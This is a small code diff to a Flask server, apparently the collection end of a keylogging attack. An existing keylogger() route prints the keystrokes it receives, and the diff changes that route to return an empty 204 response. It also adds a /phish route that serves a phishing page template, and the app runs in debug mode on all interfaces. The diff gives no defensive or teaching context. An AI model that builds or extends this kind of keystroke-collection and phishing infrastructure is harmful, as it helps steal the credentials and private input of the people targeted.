@@ -19,10 +19,16 @@ def keylogger():
 
     print("keylog: ",keylog)
 
-    response = jsonify({"test":"test"})
-    response.headers.add('Access-Control-Allow-Origin', '*')
-    return response
-    # return '', 204
+    return '', 204
+    # response = jsonify({"test":"test"})
+    # response.headers.add('Access-Control-Allow-Origin', '*')
+    # return response
+
+@app.route("/phish")
+def phish():
+    return render_template('phishing/index.html')
+
+
 
 if __name__ == '__main__':
     app.run(debug=True, host="0.0.0.0")
